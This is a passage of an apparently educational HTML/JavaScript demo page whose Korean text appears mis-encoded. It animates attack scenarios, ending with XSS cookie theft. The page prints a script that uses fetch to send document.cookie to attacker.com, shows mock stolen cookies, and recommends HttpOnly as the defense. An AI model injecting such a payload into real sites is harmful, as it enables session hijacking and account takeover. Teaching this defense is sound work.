                    '<div>âœ“ ê°œì¸ì •ë³´ (ì£¼ë¯¼ë²ˆí˜¸ í¬í•¨)</div>' +
                    '<div>âœ“ ì‹œìŠ¤í…œ ë¡œê·¸</div>' +
                    '</div></div>' +
                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
                    '<p class="font-bold">ğŸ’€ ì¹˜ëª…ì  í”¼í•´</p>' +
                    '<p>íƒ€ì¸ ê³„ì • ì™„ì „ ì¥ì•…</p>' +
                    '<p>ê°œì¸ì •ë³´ ëŒ€ëŸ‰ ìœ ì¶œ ê°€ëŠ¥</p>' +
                    '</div></div>';
                
                document.getElementById('evidence').textContent = 'userId ì¿ í‚¤ë§Œìœ¼ë¡œ ì¸ì¦';
                badge.textContent = 'ì¹˜ëª…ì ';
                badge.className = 'text-xs bg-red-600 text-white px-3 py-1 rounded';
                
            } else if (type === 4) {
                // ì‹œë‚˜ë¦¬ì˜¤ 4: XSSë¡œ ì¿ í‚¤ íƒˆì·¨
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. XSS ì·¨ì•½ì  ë°œê²¬</div>' +
                    '<div>2. document.cookieë¡œ ì¿ í‚¤ íƒˆì·¨</div>' +
                    '<div>3. ê³µê²©ì ì„œë²„ë¡œ ì „ì†¡</div>' +
                    '<div>4. ê³µê²©ìê°€ ì¿ í‚¤ ì¬ì‚¬ìš©!</div>';
                
                addTerminalLine('> XSS ì·¨ì•½ì  íƒìƒ‰...');
                await sleep(500);
                addTerminalLine('> [ë°œê²¬] ê²Œì‹œíŒ ê²€ìƒ‰ ê¸°ëŠ¥');
                await sleep(500);
                addTerminalLine('> ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‚½ì…:', 'text-yellow-400');
                await sleep(300);
                addTerminalLine('<script>fetch("http://attacker.com/steal",{', 'text-red-400');
                addTerminalLine('  body: document.cookie', 'text-red-400');
                addTerminalLine('})</script>', 'text-red-400');
                await sleep(1000);
                addTerminalLine('> [!] í”¼í•´ì ì¿ í‚¤ íƒˆì·¨!', 'text-red-400');
                await sleep(500);
                addTerminalLine('> userId=user001', 'text-red-400');
                addTerminalLine('> role=user', 'text-red-400');
                addTerminalLine('> balance=1234000', 'text-red-400');
                await sleep(500);
                addTerminalLine('> JSESSIONID=ABC123...', 'text-red-400');
                await sleep(800);
                addTerminalLine('> [!] ê³µê²©ìê°€ ì¿ í‚¤ ì¬ì‚¬ìš©', 'text-red-400');
                await sleep(500);
                addTerminalLine('> í”¼í•´ì ê³„ì • ì ‘ê·¼ ì„±ê³µ', 'text-red-400');
                
                result.innerHTML = 
                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
                    '<h4 class="font-bold text-red-700 mb-3">ğŸš¨ XSS + ì¿ í‚¤ íƒˆì·¨</h4>' +
                    '<div class="bg-gray-900 text-green-400 p-3 rounded mb-3 code-font text-xs">' +
                    '<div class="text-white">// XSS ê³µê²© ì½”ë“œ</div>' +
                    '<div>&lt;script&gt;</div>' +
                    '<div class="ml-2">var cookie = document.cookie;</div>' +
                    '<div class="ml-2 text-red-400">fetch(\'http://attacker.com/steal\', {</div>' +
                    '<div class="ml-4 text-red-400">method: \'POST\',</div>' +
                    '<div class="ml-4 text-red-400">body: cookie</div>' +
                    '<div class="ml-2 text-red-400">});</div>' +
                    '<div>&lt;/script&gt;</div>' +
                    '<div class="mt-2 text-yellow-400">// ê³µê²©ì ì„œë²„ ë¡œê·¸:</div>' +
                    '<div class="text-red-400">userId=user001; role=user; ...</div>' +
                    '</div>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">âš ï¸ HttpOnly ë¯¸ì„¤ì • ì‹œ:</p>' +
                    '<div class="space-y-1 text-xs">' +
                    '<div>â€¢ JavaScriptë¡œ ì¿ í‚¤ ì ‘ê·¼ ê°€ëŠ¥</div>' +
                    '<div>â€¢ XSSë¡œ ì¿ í‚¤ íƒˆì·¨ ê°€ëŠ¥</div>' +
                    '<div>â€¢ ì„¸ì…˜ í•˜ì´ì¬í‚¹ ìœ„í—˜</div>' +
                    '</div></div>' +
                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
                    '<p class="font-bold">ğŸ”’ ë°©ì–´ ë°©ë²•</p>' +
                    '<p>HttpOnly: true ì„¤ì • í•„ìˆ˜!</p>' +
                    '<p>â†’ document.cookie ì ‘ê·¼ ì°¨ë‹¨</p>' +
                    '</div></div>';
                
                document.getElementById('evidence').textContent = 'HttpOnly ì¿ í‚¤ ë¯¸ì‚¬ìš©';
                badge.textContent = 'ì¹˜ëª…ì ';
                badge.className = 'text-xs bg-red-600 text-white px-3 py-1 rounded';
            }
        }

        function addTerminalLine(text, color) {
            var div = document.createElement('div');
            div.className = color || 'text-green-400';
            div.textContent = text;
            document.getElementById('terminalLines').appendChild(div);
            document.getElementById('terminalLines').scrollTop = 
                document.getElementById('terminalLines').scrollHeight;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    </script>
</body>
</html>